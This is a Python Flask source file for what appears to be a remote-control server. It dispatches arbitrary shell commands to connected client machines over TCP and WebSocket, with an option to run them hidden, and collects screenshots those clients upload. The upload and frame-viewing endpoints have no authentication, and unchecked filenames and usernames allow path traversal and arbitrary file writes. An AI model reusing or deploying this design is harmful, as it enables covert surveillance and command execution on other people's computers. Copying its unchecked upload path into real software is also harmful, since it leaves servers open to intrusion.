import os
import sqlite3
import base64
import subprocess
import time
import socket
import threading

import datetime
from flask import Flask, render_template, request, jsonify, send_from_directory
from flask_sock import Sock
from functools import wraps
from dotenv import load_dotenv
import json

load_dotenv()

app = Flask(__name__)
sock = Sock(app)

DASHBOARD_PASSWORD = os.getenv("DASHBOARD_PASSWORD")

if not DASHBOARD_PASSWORD:
    raise RuntimeError("DASHBOARD_PASSWORD is not set")

SCREENSHOT_DIR = "uploaded_frames"

os.makedirs(SCREENSHOT_DIR, exist_ok=True)

active_clients = {}
TCP_PORT = int(os.getenv("TCP_PORT", "5003"))
tcp_clients = {}
tcp_clients_lock = threading.Lock()


def broadcast_tcp_message(username, payload_dict):
    payload_str = json.dumps(payload_dict) + "\n"
    payload_bytes = payload_str.encode("utf-8")

    with tcp_clients_lock:
        sockets = list(tcp_clients.get(username, set()))

    dead_sockets = set()
    dispatched = False

    for sock_obj in sockets:
        try:
            sock_obj.sendall(payload_bytes)
            dispatched = True
        except Exception:
            dead_sockets.add(sock_obj)

    if dead_sockets:
        with tcp_clients_lock:
            if username in tcp_clients:
                tcp_clients[username] -= dead_sockets
                if not tcp_clients[username]:
                    tcp_clients.pop(username, None)

    return dispatched


def handle_tcp_client(conn_sock, client_addr):
    username = None
    try:
        conn_sock.settimeout(60)
        file_obj = conn_sock.makefile("r", encoding="utf-8")

        first_line = file_obj.readline()
        if not first_line:
            return

        try:
            handshake = json.loads(first_line.strip())
        except Exception:
            return

        username = handshake.get("username")
        version = handshake.get("version")

        if not username:
            return

        with tcp_clients_lock:
            if username not in tcp_clients:
                tcp_clients[username] = set()
            tcp_clients[username].add(conn_sock)

        db_conn = get_db()
        if version:
            db_conn.execute(
                """
                INSERT INTO clients (username, version, updated_at)
                VALUES (?, ?, datetime('now'))
                ON CONFLICT(username) DO UPDATE SET version = excluded.version, updated_at = datetime('now')
            """,
                (username, version),
            )
        else:
            db_conn.execute(
                """
                INSERT INTO clients (username, updated_at)
                VALUES (?, datetime('now'))
                ON CONFLICT(username) DO UPDATE SET updated_at = datetime('now')
            """,
                (username,),
            )
        db_conn.commit()
        db_conn.close()

        while True:
            try:
                line = file_obj.readline()
                if not line:
                    break
                db_conn = get_db()
                db_conn.execute(
                    "UPDATE clients SET updated_at = datetime('now') WHERE username = ?",
                    (username,),
                )
                db_conn.commit()
                db_conn.close()
            except socket.timeout:
                try:
                    conn_sock.sendall(b'{"type":"ping"}\n')
                except Exception:
                    break
    except Exception:
        pass
    finally:
        if username:
            with tcp_clients_lock:
                if username in tcp_clients:
                    tcp_clients[username].discard(conn_sock)
                    if not tcp_clients[username]:
                        tcp_clients.pop(username, None)
        try:
            conn_sock.close()
        except Exception:
            pass


def start_tcp_server():
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server_sock.bind(("0.0.0.0", TCP_PORT))
        server_sock.listen(128)
        while True:
            conn_sock, client_addr = server_sock.accept()
            client_thread = threading.Thread(
                target=handle_tcp_client,
                args=(conn_sock, client_addr),
                daemon=True,
            )
            client_thread.start()
    except Exception as e:
        print(f"TCP server error: {e}")


tcp_thread = threading.Thread(target=start_tcp_server, daemon=True)
tcp_thread.start()

_commit_cache = {"time": 0, "commits": []}


def get_recent_commits():
    now = time.time()
    if now - _commit_cache["time"] < 10 and _commit_cache["commits"]:
        return _commit_cache["commits"]

    try:
        output = subprocess.check_output(
            ["git", "log", "-n", "50", "--grep=updated exe", "-i", "--format=%h"],
            cwd=os.path.dirname(os.path.abspath(__file__)),
            text=True,
        )
        commits = [c.strip() for c in output.strip().splitlines() if c.strip()]
        if commits:
            _commit_cache["time"] = now
            _commit_cache["commits"] = commits
            return commits
    except Exception:
        pass

    return _commit_cache.get("commits", [])


def get_db():
    conn = sqlite3.connect("database.db")
    conn.row_factory = sqlite3.Row
    return conn


def require_password(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        password = request.headers.get("x-password")

        if not password or password != DASHBOARD_PASSWORD:
            return jsonify({"detail": "Unauthorized"}), 401

        return f(*args, **kwargs)

    return wrapper


def init_db():
    conn = get_db()

    conn.execute(
        """
        CREATE TABLE IF NOT EXISTS clients (
            username TEXT PRIMARY KEY,
            cmd TEXT,
            run INTEGER DEFAULT 0,
            visible INTEGER DEFAULT 1,
            capture INTEGER DEFAULT 0,
            version TEXT,
            updated_at TEXT
        )
    """
    )

    try:
        conn.execute("ALTER TABLE clients ADD COLUMN version TEXT")
    except Exception:
        pass

    conn.commit()
    conn.close()


init_db()


@app.route("/")
def index():
    return render_template("index.html")


@app.get("/api/clients")
@require_password
def get_clients():
    conn = get_db()

    rows = conn.execute(
        """
        SELECT username, updated_at, visible, version
        FROM clients
        ORDER BY updated_at DESC
    """
    ).fetchall()

    conn.close()

    recent_commits = get_recent_commits()
    latest_sha = recent_commits[0][:7] if recent_commits else ""

    result = []
    now_utc_str = datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")

    for row in rows:
        ver = (row["version"] or "").strip()
        commits_behind = None
        if ver and recent_commits:
            ver_short = ver[:7].lower()
            for idx, c_sha in enumerate(recent_commits):
                c_short = c_sha[:7].lower()
                if c_short.startswith(ver_short) or ver_short.startswith(c_short):
                    commits_behind = idx
                    break

        updated_at = row["updated_at"]
        with tcp_clients_lock:
            is_active = (row["username"] in tcp_clients and tcp_clients[row["username"]]) or (row["username"] in active_clients and active_clients[row["username"]])
        if is_active:
            updated_at = now_utc_str

        result.append(
            {
                "username": row["username"],
                "updated_at": updated_at,
                "visible": row["visible"] if row["visible"] is not None else 1,
                "version": ver[:7] if ver else "",
                "commits_behind": commits_behind,
                "latest_version": latest_sha,
            }
        )

    return jsonify(result)


@app.get("/api/frames/<username>")
@require_password
def get_frames(username):
    user_dir = os.path.join(SCREENSHOT_DIR, username)

    if not os.path.exists(user_dir):
        return jsonify([])

    files = sorted(
        [
            f
            for f in os.listdir(user_dir)
            if f.lower().endswith((".png", ".jpg", ".jpeg"))
        ],
        key=lambda f: int("".join(filter(str.isdigit, f)) or "0"),
    )

    return jsonify(files)


@app.post("/api/visibility")
@require_password
def set_visibility():
    data = request.get_json(silent=True) or {}

    username = data.get("username")
    visible = data.get("visible")

    if not username:
        return jsonify({"status": "error", "message": "Missing username"}), 400

    if visible is None:
        return jsonify({"status": "error", "message": "Missing visible"}), 400

    conn = get_db()

    conn.execute(
        """
        INSERT INTO clients (
            username,
            visible,
            updated_at
        )
        VALUES (?, ?, datetime('now'))

        ON CONFLICT(username) DO UPDATE SET
            visible = excluded.visible,
            updated_at = datetime('now')
    """,
        (username, visible),
    )

    conn.commit()
    conn.close()

    return jsonify({"status": "success"})


@app.post("/api/command")
@require_password
def set_command():
    data = request.get_json(silent=True) or {}

    username = data.get("username")
    cmd = data.get("cmd")
    visible = data.get("visible", 1)

    if not username:
        return jsonify({"status": "error", "message": "Missing username"}), 400

    if cmd is None:
        return jsonify({"status": "error", "message": "Missing cmd"}), 400

    conn = get_db()

    conn.execute(
        """
        INSERT INTO clients (
            username,
            visible,
            updated_at
        )
        VALUES (?, ?, datetime('now'))

        ON CONFLICT(username) DO UPDATE SET
            visible = excluded.visible,
            updated_at = datetime('now')
    """,
        (username, visible),
    )

    conn.commit()
    conn.close()

    payload = {
        "cmd": cmd,
        "run": True,
        "visible": bool(visible),
        "capture": False,
    }

    dispatched = broadcast_tcp_message(username, payload)

    if username in active_clients and active_clients[username]:
        to_remove = set()
        for ws_client in list(active_clients[username]):
            try:
                ws_client.send(json.dumps(payload))
                dispatched = True
            except Exception:
                to_remove.add(ws_client)

        for dead_ws in to_remove:
            active_clients[username].discard(dead_ws)
        if not active_clients[username]:
            active_clients.pop(username, None)

    if dispatched:
        return jsonify({"status": "success", "message": "Command dispatched"})
    else:
        return jsonify({"status": "error", "message": "Client offline"}), 400


@sock.route("/ws/client")
def client_websocket(ws):
    username = request.args.get("username")
    version = request.args.get("version")
    if not username:
        return

    if username not in active_clients:
        active_clients[username] = set()
    active_clients[username].add(ws)

    try:
        conn = get_db()
        if version:
            conn.execute(
                """
                INSERT INTO clients (username, version, updated_at)
                VALUES (?, ?, datetime('now'))
                ON CONFLICT(username) DO UPDATE SET version = excluded.version, updated_at = datetime('now')
            """,
                (username, version),
            )
        else:
            conn.execute(
                """
                INSERT INTO clients (username, updated_at)
                VALUES (?, datetime('now'))
                ON CONFLICT(username) DO UPDATE SET updated_at = datetime('now')
            """,
                (username,),
            )
        conn.commit()
        conn.close()

        while True:
            data = ws.receive()
            if data is None:
                break

            try:
                msg = json.loads(data)
                ping_ver = msg.get("version") or version
                conn = get_db()
                if ping_ver:
                    conn.execute(
                        "UPDATE clients SET version = ?, updated_at = datetime('now') WHERE username = ?",
                        (ping_ver, username),
                    )
                else:
                    conn.execute(
                        "UPDATE clients SET updated_at = datetime('now') WHERE username = ?",
                        (username,),
                    )
                conn.commit()
                conn.close()

                if msg.get("type") == "ping":
                    ws.send(json.dumps({"type": "pong"}))
            except Exception:
                conn = get_db()
                conn.execute(
                    "UPDATE clients SET updated_at = datetime('now') WHERE username = ?",
                    (username,),
                )
                conn.commit()
                conn.close()
    except Exception:
        pass
    finally:
        if username in active_clients:
            active_clients[username].discard(ws)
            if not active_clients[username]:
                active_clients.pop(username, None)


@app.post("/api/upload")
def upload_screenshot():
    data = request.get_json(silent=True) or {}

    username = data.get("username")
    filename = data.get("filename")
    image_base64 = data.get("image")

    if not username or not filename or not image_base64:
        return jsonify({"status": "error", "message": "Missing fields"}), 400

    client_folder = os.path.join(SCREENSHOT_DIR, username)
    os.makedirs(client_folder, exist_ok=True)

    file_path = os.path.join(client_folder, filename)

    try:
        if "," in image_base64:
            image_base64 = image_base64.split(",", 1)[1]

        image_bytes = base64.b64decode(image_base64)

        with open(file_path, "wb") as f:
            f.write(image_bytes)

        return jsonify({"status": "success"})

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


@app.get("/frames/<username>/<filename>")
def get_frame(username, filename):
    user_dir = os.path.join(SCREENSHOT_DIR, username)

    response = send_from_directory(user_dir, filename)
    response.headers["Cache-Control"] = "public, max-age=31536000, immutable"
    return response


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", "5002")), debug=False)
